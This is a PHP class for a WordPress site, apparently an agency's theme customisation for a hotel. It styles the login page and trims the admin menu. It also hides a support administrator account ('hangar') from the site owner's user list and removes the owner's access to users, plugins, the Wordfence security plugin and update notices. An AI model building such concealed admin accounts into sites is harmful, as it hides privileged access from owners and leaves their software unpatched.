<?php

class CTR_System {

    const USUARIO_SUPORTE = 'hangar';

    public function __construct() {

        // Remover links do menu de Administracao
        add_action('admin_menu', array('CTR_System', 'custom_admin_menu'), 9999 );

        // Ao fazer login, redirecionar para a pagina Elementos
        add_filter('login_redirect', array('CTR_System', 'custom_login_redirect'), 10, 3);

        add_action('login_enqueue_scripts', array('CTR_System', 'cutom_login_logo') );

        add_action('admin_menu', array('CTR_System', 'hide_update_nag') );

        // Esconder usuario de suporte para evitar que cliente remova ou altere dados
        add_action('pre_user_query', array('CTR_System', 'hide_admin_account') );

        //Renomeia a função Assinante para Inscrito
        add_action('init', array('CTR_System', 'change_role_name'));
    }

    public static function custom_admin_menu() {

        // Os recursos abaixo sao visiveis apenas pelo usuario "hangar"
        $usuario_atual = wp_get_current_user();

        if ($usuario_atual->data->user_login != CTR_System::USUARIO_SUPORTE) {
            remove_submenu_page('index.php', 'update-core.php'); // Remover Atualizações
            //remove_menu_page('edit.php'); // Posts
            remove_menu_page('edit-comments.php'); // Comentários
            //remove_menu_page('edit.php?post_type=page'); // Páginas
            remove_menu_page('yit_plugin_panel'); //  Yith Plugins
            remove_menu_page('users.php'); // Usuarios - Bloqueado para evitar que cliente remova ou edite nosso usuario de suporte
            // remove_menu_page('themes.php'); // Temas
            remove_menu_page('plugins.php'); // Plugins
            remove_menu_page('tools.php'); // Ferramentas
            remove_menu_page('options-general.php'); // Configurações
            remove_menu_page('wpseo_dashboard'); // Yoast SEO
            remove_action('admin_bar_menu', 'wpseo_admin_bar_menu',95); // Yoast SEO na Barra de Admin
            remove_menu_page('wps_'); // Ferramentas
            remove_menu_page('wp-product-feed-manager'); // Product Feed Manager
            remove_menu_page('mappress'); // Mappress
            remove_menu_page('Wordfence'); // Wordfence
            remove_menu_page('wpcf7'); // Ferramentas
            remove_menu_page('woocommerce'); // Woocommerce
            remove_menu_page('gadash_settings');
            remove_menu_page('wp-mail-smtp');
            remove_menu_page('edit.php');
            remove_menu_page('sitepress-multilingual-cms-master/menu/languages.php');
        }

        // Utilize funcao abaixo para explorar nomes dos itens do menu e assim poder remove-los
        // global $menu;
        // echo var_export($menu);
    }

    public static function custom_login_redirect($redirect_to, $requested, $user) {
        if ( isset($user->roles) ) {
            return site_url('/wp-admin/index.php');
        }
    }

    public static function hide_update_nag() {
        remove_action('admin_notices', 'update_nag', 3);
    }


    public static function hide_admin_account($user_search) {
        global $current_user;

        if ($current_user->user_login != CTR_System::USUARIO_SUPORTE) {
            global $wpdb;
            $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != '".CTR_System::USUARIO_SUPORTE."'", $user_search->query_where);
        }
    }

    public static function change_role_name() {
        global $wp_roles;
    
        if ( ! isset( $wp_roles ) )
            $wp_roles = new WP_Roles();
    
        //You can list all currently available roles like this...
        //$roles = $wp_roles->get_names();
        //print_r($roles);
    
        //You can replace "administrator" with any other role "editor", "author", "contributor" or "subscriber"...
        $wp_roles->roles['subscriber']['name'] = 'Inscrito';
        $wp_roles->role_names['subscriber'] = 'Inscrito';           
    }

    public static function cutom_login_logo() {
        echo '<style type="text/css">
        body.login div#login h1 a {
            background-image: url('.theme_url('public/images/logo-hotel-villareal-marina.png').');
            -webkit-background-size: auto;
            background-size: auto;
            margin: 0 auto 20px;
            width: 270px;
            height: 160px;
            user-select: none!important;
            outline: none!important;
        }
        .login{
            background-color: #261201;
        }
        .login #loginform{
            background-color: #261201;
            border-color: #734E20!important;
            border-top-left-radius: 25px!important;
            border-top-right-radius: 25px!important;
            border-bottom-left-radius: 25px!important;
        }
        .login label{
            color: #FFFFFF;
        }
        .login #wp-submit{
            background-color: #734E20!important;
            border-color: #734E20!important;
            color: #fff!important;
            transition: 0.4s!important;
        }
        .login #wp-submit:hover{
            background-color: transparent!important;
            color: #FFFFFF!important;
            transition: 0.4s!important;
        }
        .login #login_error strong{
            color: #004740!important;
        }
        .login .input{
            border-color: #734E20!important;
            background-color: #fff!important;
            color: #000!important;
            font-size: 1.2rem!important;
        }
        .login input[type=checkbox]{
            background: transparent!important;
            border: 1px solid #734E20!important;
        }
        .login submit input{
            font-size: initial!important;
        }
        .login input:focus, .login input:hover{
            box-shadow: none!important;
        }
        .login #nav a{
            color: #FFFFFF!important;
        }
        .login #backtoblog a{
            color: #FFFFFF!important;
        }
        .login .dashicons-visibility{
            color: #734E20!important;
        }
        .login #user_pass{
            background-position: 85% 50%!important;
        }
        input[type=checkbox]:checked::before{
            filter: brightness(5);
        }
        .login .message{
            background-color: #734E20!important;
            border-left-color: #fff!important;
            font-weight: 500;
            color: #fff!important
        }
        #login{
            padding: 4% 0 0!important;
        }
        </style>';
    }
}

new CTR_System();
?>